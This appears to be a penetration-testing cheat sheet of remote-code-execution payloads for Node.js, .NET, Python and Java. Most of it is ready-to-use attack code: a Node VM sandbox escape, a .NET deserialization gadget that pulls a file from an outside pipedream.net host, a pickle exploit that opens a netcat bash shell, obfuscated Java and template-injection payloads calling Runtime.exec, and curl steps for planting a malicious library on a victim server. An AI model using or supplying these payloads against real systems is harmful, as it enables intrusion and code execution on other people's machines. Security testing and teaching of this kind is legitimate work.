---
description: Helpful stuff
---

# Remote Code Execution

## Node js

**Bypassing / slashes**

```javascript
\\\\x2f
```

**Get object properties \(can be helpful in debugging\)**

```text
Object.getOwnPropertyNames(
```

**Node VM escape PoC**

```text
this.context.constructor.constructor('return process')().mainModule.require('child_process').exec('touch \\\\x2ftmp\\\\x2f11111')
```

**Proto pollution detection**

```text
{"constructor": {"prototype": {"a0": true}}}
```

## DotNet

For debugging purposes you can use dnSpy.  
IIS process, that is working with your [ASP.Net](http://asp.net/) code is w3wp.exe, so you should use it to attach.   
We then need to access Debug &gt; Windows &gt; Modules to list all the modules loaded by our w3wp.exe process.

What entry points to search for: 

```csharp
Cookies
HttpContext.Current.Request.IsAuthenticated
Request.getParameter
context.User = Thread.CurrentPrincipal
```

How you can fuzz app methods:

\(References **DotNetNuke.dll** and **PresentationFramework.dll**\)

```csharp
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;

namespace DotNetExploit
{
    class MainClass
    {
        public static void Main(string[] args)
        { 
            Console.WriteLine("Hello World!");
            var myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("<https://enp50ybm0r.x.pipedream.net>");
            myODP.MethodParameters.Add("POC");
            Console.WriteLine("Done!");
        }
    }
}
```

## Python

Look for vulnerable libraries by using snyk.io and ossindex

Pickle exploit example

```python
import cPickle
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
```

## Java

**Equals\(&lt;userinput&gt;\) vector**

```text
"".equals(javax.script.ScriptEngineManager.class.getConstructor()
.newInstance().getEngineByExtension("js")
.eval("java.lang.Auntime.getAuntime().exec(\\"touch /tmp/owned.jsp\\")"
.replaceAll("A","R")))
```

**controller.getClass\(\).getMethod\(task\).invoke\(controller\);**

```text
rawJson={"controller":"java.lang.ProcessBuilder","task":"start","data":["touch","hacked.jsp"]}
```

**renderFragment\(\)**

```text
user=&temp=#set($s="")#set($stringClass=$s.getClass()
.forName("java.lang.Runtime").getRuntime()
.exec("touch hacked.jsp"))$stringClass
```

**System.loadLibrary\(\)**

1. Upload file:

`curl -v -F 'upload=@/tmp/libDEOBFUSCATION_LIB.so' [<http://victim.org/>](<http://victim.org/>)`

1. Load malicious library:

`curl -v --cookie 'env=.java.library.path@/var/myapp/data'`

